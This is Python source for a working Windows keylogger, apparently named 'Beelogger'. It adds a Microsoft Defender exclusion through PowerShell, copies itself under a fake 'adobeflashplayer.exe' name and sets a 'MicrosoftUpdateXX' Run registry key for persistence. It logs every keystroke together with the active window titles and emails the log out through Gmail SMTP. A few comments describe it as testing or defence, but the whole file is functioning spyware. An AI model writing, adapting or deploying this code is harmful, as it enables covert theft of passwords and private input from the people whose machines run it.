import ctypes
import win32gui
#import pythoncom
# Have to install the package : pip install keyboard
import keyboard
import os
from os import path
from time import sleep
from threading import Thread
#import urllib, urllib2
import smtplib
import datetime
#Install the package pywin32 to use win32com, win32api, win32gui...
import win32com.client
import win32event, win32api, winerror, win32gui
from winreg import *
import shutil
import sys
import subprocess

# Instance variable dir to store the path where the script will be copied
dir = r"C:\Users\Public\Libraries\adobeflashplayer.exe"
excludedir = r"C:\Users"

# Create a mutex to ensure only one instance is running (prevent multiple execution)
# mutex name : 'NOSIGN'
ironm = win32event.CreateMutex(None, 1, 'NOSIGN')
#Check if the mutex already exists
if win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS:
    ironm = None
    # write "nope" in check
    print ("nope")
    # if yes exit the script
    sys.exit()

# Testing persistence and to show how to defend against Powershell injecting code
powershell_cmd = [
    "powershell.exe",
    "-Command",
    f"Add-MpPreference -ExclusionPath '{excludedir}'"
]

# Testing the powershell command
try:
    result = subprocess.run(powershell_cmd, capture_output=True, text=True)
    
    if result.returncode == 0:
        print(f"[+] Exclusion added : {excludedir}")
    else:
        print(f"[-] Error : {result.stderr.strip()}")

except Exception as e:
    print(f"[-] Exception : {e}")

# Instance variables data to store the keys and x, count for other uses
x, data, count= '', '', 0


def startup():
    shutil.copy(sys.argv[0], dir)
    aReg = ConnectRegistry(None, HKEY_CURRENT_USER)
    aKey = OpenKey(aReg, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", 0, KEY_WRITE)
    SetValueEx(aKey,"MicrosoftUpdateXX", 0, REG_SZ, dir)

# If the script is not already present in the target directory, call the function startup()
if not path.isfile(dir):
    startup()

# Launch the copied file for execution
try:
    # Launch the copied file
     subprocess.Popen([dir])
     print(f"[+] Lancement de {dir} réussi.")
except Exception as e:
     print(f"[!] Erreur lors du lancement de {dir} : {e}")

# Function to send an email   
def send_mail():
    global data
    # Infinite loop to check if data length is greater than 200 characters
    while True:
        if len(data) >= 200:
            timeInSecs = datetime.datetime.now()
            # SMTP configuration using smtp.gmail.com
            SERVER = "smtp.gmail.com"
            PORT = 587
            # Type email from bee.py file
            USER = EEMAIL
            # Create your app password with this link : https://myaccount.google.com/apppasswords
            # Type app password created with the link bellow typing from bee.py file
            PASS = EPASS
            # From You to You
            FROM = USER
            TO = USER
            SUBJECT = "Beelogger: " + timeInSecs.isoformat()
            # Test window for better defense
            window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
            MESSAGE = f"Window: {window}\n" + data

            # Corps of the email
            message_payload = "\r\n".join((
                "From: %s" %FROM,
                "To: %s" %TO,
                "Subject: %s" %SUBJECT,
                "",
                MESSAGE))

            # Try to send the email
            try:
                server = smtplib.SMTP(SERVER, PORT)
                server.starttls()
                server.login(USER, PASS)
                server.sendmail(FROM, TO, message_payload.encode('utf-8'))
                data = ''
                # If success print the success message with the time
                print ("Sended mail to " + TO + " at " + timeInSecs.isoformat())
                server.quit()
            # Catch the error if the email is not sent
            except Exception as error:
                print(error)
        # Every 2 minutes check if data length is greater than 200 characters
        sleep(120)

# pushing (1 parameter) The old PyHook function to log keys and active window
def pushing(event):
    # Global varuable to store the logged data
    global data
    # Get the title of the currently active window
    window = win32gui.GetWindowText(win32gui.GetForegroundWindow())

    # Get the name of the key pressed.
    key_name = event.name if hasattr(event, 'name') else str(event)

    # Check if the function attribute 'lastWindow' exists; if not, initialize it to an empty string
    if not hasattr(pushing, "lastWindow"):
        pushing.lastWindow = ""

    # If the active window has changed since the last key press
    if window != pushing.lastWindow:
        # Update the lastWindow attribute to the new window
        pushing.lastWindow = window
        # Add a marker to the log indicating the new window title
        data += ' { ' + pushing.lastWindow + ' } '
        # Increment
        data += key_name
    else:
        # If the window hasn't changed, log the key pressed
        data += key_name

    # Print final result
    print(f"Touche: {key_name} | Fenêtre: {window}")

# __main__ because it's not a module but a script
if __name__ == '__main__':

    # Send emails in the background without blocking the software
    triggerThread = Thread(target=send_mail)
    triggerThread.start()

    # Register the pushing function to be called every time a key is pressed
    keyboard.on_press(pushing)

    # Enter an infinite listening loop !
    keyboard.wait()
    